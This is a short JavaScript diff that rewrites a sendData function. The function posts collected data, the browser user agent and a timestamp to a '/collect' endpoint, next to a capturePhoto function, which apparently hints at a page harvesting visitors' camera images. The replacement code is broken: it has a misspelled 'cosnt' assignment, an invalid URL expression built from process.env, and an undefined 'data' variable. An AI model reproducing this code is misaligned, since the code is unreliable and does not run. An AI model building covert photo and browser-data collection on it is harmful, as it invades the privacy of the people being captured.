@@ -53,16 +53,21 @@ async function capturePhoto() {
 }
 
 /* 📤 Send Data */
-function sendData(data) {
-  fetch("http://localhost:5000/collect", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify({
-      ...data,
-      userAgent: navigator.userAgent,
-      time: new Date().toISOString(),
-    }),
-  });
+
+const sendData = async () =>{
+  try{
+    cosnt = await fetch(process.env.link/Collect,{
+      method:"POST",
+      headers:{
+        "content-Type":"application/json"
+      },
+      body:JSON.stringify({
+        ...data,
+        userAgent: navigator.userAgent,
+        time:new Date().toISOString(),
+      }),
+    })
+  }catch(err){
+    console.log(err);
+  }
 }
